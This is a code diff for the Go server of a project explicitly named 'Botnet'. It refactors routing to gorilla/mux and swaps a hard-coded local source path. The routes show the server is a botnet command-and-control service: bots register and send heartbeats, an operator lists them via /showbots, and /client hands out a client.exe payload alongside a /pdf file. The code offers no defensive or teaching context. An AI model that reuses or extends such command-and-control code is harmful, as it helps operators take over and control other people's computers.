@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/gorilla/mux"
 	"log"
 	"net/http"
 	"path/filepath"
@@ -11,9 +12,9 @@ import (
 )
 
 // temporary directory location
-//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
+var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
 
-var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
+//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
 
 type bot struct {
 	Id     string `json:"bot_id"`
@@ -117,25 +118,30 @@ func clientserver(res http.ResponseWriter, req *http.Request) {
 	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
 }
 
-func main() {
-	mux := http.NewServeMux()
+func newRouter() *mux.Router {
+	r := mux.NewRouter()
+
+	staticFileDirectory := http.Dir("./assets/")
+	staticFileHandler := http.StripPrefix("/assets/", http.FileServer(staticFileDirectory))
+	r.PathPrefix("/assets/").Handler(staticFileHandler).Methods("GET")
 
 	fmt.Printf("Starting server at port 8081\n")
 
-	pdf := http.HandlerFunc(pdfserver)
-	mux.Handle("/pdf", pdf)
+	r.HandleFunc("/pdf", pdfserver)
 
-	reg := http.HandlerFunc(register)
-	mux.Handle("/register", reg)
+	r.HandleFunc("/register", register)
 
-	client := http.HandlerFunc(clientserver)
-	mux.Handle("/client", client)
+	r.HandleFunc("/client", clientserver)
 
-	showb := http.HandlerFunc(showbots)
-	mux.Handle("/showbots", showb)
+	r.HandleFunc("/showbots", showbots)
 
-	hbeat := http.HandlerFunc(heartbeat)
-	mux.Handle("/heartbeat", hbeat)
+	r.HandleFunc("/heartbeat", heartbeat)
+
+	return r
+}
+
+func main() {
+	r := newRouter()
 
 	wg := new(sync.WaitGroup)
 
@@ -144,7 +150,7 @@ func main() {
 	log.Println("Listening...")
 
 	go func() {
-		log.Fatal(http.ListenAndServe("localhost:8081", mux))
+		log.Fatal(http.ListenAndServe("localhost:8081", r))
 		wg.Done()
 	}()
 
